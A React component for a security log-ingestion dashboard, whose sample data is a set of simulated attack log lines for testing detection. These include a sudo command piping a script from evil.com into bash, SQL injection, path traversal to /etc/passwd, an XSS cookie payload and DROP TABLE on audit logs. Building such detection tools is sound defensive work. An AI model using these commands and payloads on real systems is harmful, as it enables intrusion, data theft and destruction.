import { useState, useRef } from 'react';
import { Upload, Send, FileText, CheckCircle, AlertTriangle } from 'lucide-react';
import { ingestLogs, uploadLogFile } from '../api';

const SAMPLE_LOGS = `Mar  5 08:23:41 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
Mar  5 08:23:42 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
Mar  5 08:24:15 webserver01 sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://evil.com/payload.sh | bash
45.33.32.156 - - [05/Mar/2024:09:00:00 +0000] "GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 4521 "-" "sqlmap/1.7.2#stable"
192.42.116.16 - - [05/Mar/2024:09:15:00 +0000] "GET /../../../../../../etc/passwd HTTP/1.1" 400 326 "-" "nikto/2.1.6"
171.25.193.9 - - [05/Mar/2024:10:30:00 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 5120 "https://evil.com" "Mozilla/5.0"
2024-03-05 10:00:00 UTC [5434] dba@production LOG:  statement: DROP TABLE audit_logs;`;

export default function LogIngestion() {
    const [rawLogs, setRawLogs] = useState('');
    const [logType, setLogType] = useState('');
    const [result, setResult] = useState(null);
    const [loading, setLoading] = useState(false);
    const fileRef = useRef(null);

    const handleSubmit = async () => {
        if (!rawLogs.trim()) return;
        setLoading(true);
        setResult(null);
        try {
            const lines = rawLogs.split('\n').filter(l => l.trim());
            const data = await ingestLogs(lines, logType || null);
            setResult(data);
        } catch (err) {
            setResult({ error: err.message });
        }
        setLoading(false);
    };

    const handleFile = async (e) => {
        const file = e.target.files?.[0];
        if (!file) return;
        setLoading(true);
        setResult(null);
        try {
            const data = await uploadLogFile(file, logType || null);
            setResult(data);
        } catch (err) {
            setResult({ error: err.message });
        }
        setLoading(false);
    };

    return (
        <div>
            <div className="page-header">
                <h2>📄 Log Ingestion</h2>
                <p>Paste raw logs or upload log files for automated analysis</p>
            </div>

            <div className="grid-2">
                {/* Input Panel */}
                <div className="card">
                    <div className="card-header">
                        <span className="card-title">Raw Log Input</span>
                        <button className="btn btn-secondary btn-sm" onClick={() => setRawLogs(SAMPLE_LOGS)}>
                            Load Sample Data
                        </button>
                    </div>

                    <div style={{ marginBottom: '0.75rem' }}>
                        <label className="form-label">Log Type (optional — auto-detects if omitted)</label>
                        <select className="form-select" value={logType} onChange={e => setLogType(e.target.value)}>
                            <option value="">Auto-detect</option>
                            <option value="syslog">Syslog</option>
                            <option value="http_access">HTTP Access Log</option>
                            <option value="db_audit">DB Audit Log</option>
                        </select>
                    </div>

                    <div style={{ marginBottom: '0.75rem' }}>
                        <label className="form-label">Log Lines</label>
                        <textarea
                            className="form-textarea"
                            rows={12}
                            placeholder="Paste raw log lines here..."
                            value={rawLogs}
                            onChange={e => setRawLogs(e.target.value)}
                        />
                    </div>

                    <div style={{ display: 'flex', gap: '0.75rem' }}>
                        <button className="btn btn-primary" onClick={handleSubmit} disabled={loading || !rawLogs.trim()}>
                            {loading ? <div className="loading-spinner" style={{ width: 16, height: 16, margin: 0 }} /> : <Send size={16} />}
                            Analyze Logs
                        </button>
                        <button className="btn btn-secondary" onClick={() => fileRef.current?.click()} disabled={loading}>
                            <Upload size={16} /> Upload File
                        </button>
                        <input type="file" ref={fileRef} onChange={handleFile} style={{ display: 'none' }} accept=".log,.txt,.csv" />
                    </div>
                </div>

                {/* Results Panel */}
                <div className="card">
                    <div className="card-header">
                        <span className="card-title">Analysis Results</span>
                    </div>

                    {!result && !loading && (
                        <div className="empty-state">
                            <FileText size={40} style={{ marginBottom: '1rem', opacity: 0.3 }} />
                            <p>Submit logs to see analysis results</p>
                        </div>
                    )}

                    {loading && (
                        <div className="loading-state">
                            <div className="loading-spinner" />
                            <p>Analyzing logs...</p>
                        </div>
                    )}

                    {result && !result.error && (
                        <div className="animate-in">
                            <div className="stats-grid" style={{ gridTemplateColumns: '1fr 1fr' }}>
                                <div className="stat-card">
                                    <div className="stat-value" style={{ fontSize: '1.5rem' }}>{result.total_lines}</div>
                                    <div className="stat-label">Lines Received</div>
                                </div>
                                <div className="stat-card">
                                    <div className="stat-value" style={{ fontSize: '1.5rem', color: 'var(--success)' }}>{result.parsed}</div>
                                    <div className="stat-label">Parsed</div>
                                </div>
                                <div className="stat-card">
                                    <div className="stat-value" style={{ fontSize: '1.5rem', color: 'var(--medium)' }}>{result.suspicious}</div>
                                    <div className="stat-label">Suspicious</div>
                                </div>
                                <div className="stat-card">
                                    <div className="stat-value" style={{ fontSize: '1.5rem', color: 'var(--critical)' }}>{result.alerts_generated}</div>
                                    <div className="stat-label">Alerts Generated</div>
                                </div>
                            </div>

                            <div style={{
                                marginTop: '1rem', padding: '0.75rem', borderRadius: 'var(--radius-sm)',
                                background: result.alerts_generated > 0 ? 'var(--critical-bg)' : 'var(--success-bg)',
                                border: `1px solid ${result.alerts_generated > 0 ? 'var(--critical-border)' : 'rgba(16,185,129,0.25)'}`,
                                display: 'flex', alignItems: 'center', gap: '0.5rem',
                            }}>
                                {result.alerts_generated > 0 ? (
                                    <>
                                        <AlertTriangle size={16} style={{ color: 'var(--critical)' }} />
                                        <span style={{ fontSize: '0.85rem', color: 'var(--critical)' }}>
                                            <strong>{result.alerts_generated}</strong> security alerts generated — check the Alerts & Incidents pages.
                                        </span>
                                    </>
                                ) : (
                                    <>
                                        <CheckCircle size={16} style={{ color: 'var(--success)' }} />
                                        <span style={{ fontSize: '0.85rem', color: 'var(--success)' }}>
                                            No threats detected in submitted logs.
                                        </span>
                                    </>
                                )}
                            </div>
                        </div>
                    )}

                    {result?.error && (
                        <div style={{ padding: '1rem', background: 'var(--critical-bg)', borderRadius: 'var(--radius-sm)', color: 'var(--critical)' }}>
                            Error: {result.error}
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
